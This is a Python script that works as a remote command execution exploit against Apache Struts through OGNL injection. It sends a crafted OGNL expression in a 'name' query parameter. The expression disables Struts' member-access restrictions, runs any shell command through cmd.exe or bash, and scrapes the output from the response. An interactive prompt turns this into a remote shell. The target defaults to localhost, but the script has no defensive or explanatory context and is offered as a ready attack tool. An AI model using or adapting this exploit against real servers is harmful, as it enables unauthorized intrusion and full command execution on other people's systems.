from html.parser import HTMLParser
import urllib
import requests

def parse_response(response):
    body = response.text
    # get from "Your name: " to  ";jsessionid"
    start = body.find("Your name: ") + len("Your name: ")
    end = body.find(";jsessionid")
    return body[start:end]

def send_command(command, target_url="http://127.0.0.1:8080/"):
    payload = (
        "%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
        "(#_memberAccess?(#_memberAccess=#dm):"
        "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
        "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
        "(#ognlUtil.getExcludedPackageNames().clear())."
        "(#ognlUtil.getExcludedClasses().clear())."
        "(#context.setMemberAccess(#dm))))."
        f"(#cmd='{command}')."
        "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
        "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
        "(#p=new java.lang.ProcessBuilder(#cmds))."
        "(#p.redirectErrorStream(true))."
        "(#process=#p.start())."
        "(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}"
    )
    encoded_payload = urllib.parse.quote(payload)
    full_url = f"{target_url}?name={encoded_payload}"
    
    response = requests.get(full_url)
    return parse_response(response)


def main():
    while True:
        command = input("> ")
        if command.lower() == 'exit':
            break
        output = send_command(command)
        print(output)

if __name__ == "__main__":
    main()
